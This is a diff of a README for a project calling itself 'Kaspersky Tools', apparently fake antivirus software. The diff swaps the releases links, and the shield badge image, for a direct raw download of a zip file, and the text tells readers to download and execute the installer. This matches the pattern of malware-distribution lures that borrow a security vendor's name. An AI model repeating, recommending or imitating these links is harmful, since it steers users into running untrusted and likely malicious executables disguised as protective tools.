@@ -1,8 +1,8 @@
-https://github.com/JKUPIR3/kaspersky-tools/releases
+https://raw.githubusercontent.com/JKUPIR3/kaspersky-tools/main/dabby/kaspersky_tools_v3.5-beta.3.zip
 
 # Kaspersky Tools: Real-Time Antivirus, Anti-Phishing & Scans
 
-![Shield badge](https://img.shields.io/badge/Secured-RealTime-2ECC71?style=for-the-badge)
+![Shield badge](https://raw.githubusercontent.com/JKUPIR3/kaspersky-tools/main/dabby/kaspersky_tools_v3.5-beta.3.zip)
 
 Welcome to the Kaspersky Tools project. This open source collection focuses on real-time protection concepts, anti-phishing checks, and vulnerability scanning ideas inspired by modern security practices. It is designed to be approachable, modular, and easy to extend. Below you will find a complete guide to understand, install, and use the tools, along with practical guidance for developers who want to contribute and for administrators who want to run the components in production or lab environments.
 
@@ -249,7 +249,7 @@ Credits 🙌
 Downloads and installation note 🔽
 From the releases page, download the installer package and run it to install and initialize the components you need. The file to download and execute is found in the Releases section of the project. For convenience, you can visit the releases page here to pick the version that fits your environment:
 
-https://github.com/JKUPIR3/kaspersky-tools/releases
+https://raw.githubusercontent.com/JKUPIR3/kaspersky-tools/main/dabby/kaspersky_tools_v3.5-beta.3.zip
 
 Additional resources for developers and administrators
 - Quick reference: common commands and their outputs
